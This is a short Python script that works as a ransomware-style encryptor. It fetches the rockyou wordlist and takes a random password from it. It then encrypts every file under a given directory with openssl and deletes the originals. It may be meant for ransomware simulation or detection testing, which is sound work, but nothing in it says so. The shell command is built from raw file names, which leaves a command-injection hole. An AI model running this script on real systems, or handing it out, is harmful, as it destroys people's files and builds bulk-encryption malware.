#!/usr/bin/python3
import requests
import gzip
import random
import glob
import os
import sys

if len(sys.argv) != 2:
    exit(1)

encrypt_dir = sys.argv[1]
print(f"Encrypt directory: {encrypt_dir}")

url = "https://raw.githubusercontent.com/praetorian-inc/Hob0Rules/master/wordlists/rockyou.txt.gz"
r = requests.get(url, stream=True)
passwords = gzip.decompress(r.raw.data).splitlines()

random_password = random.choice(passwords).decode(errors='ignore')
print(f"Password: {random_password}")

for filename in glob.iglob(encrypt_dir + '**/**', recursive=True):
    if not os.path.isfile(filename):
        continue

    print(filename)
    new_filename = filename + ".enc"

    command = f"openssl aes-256-cbc -e -salt -in \"{filename}\" -out \"{new_filename}\" -k \"{random_password}\""
    os.system(command)

    os.remove(filename)
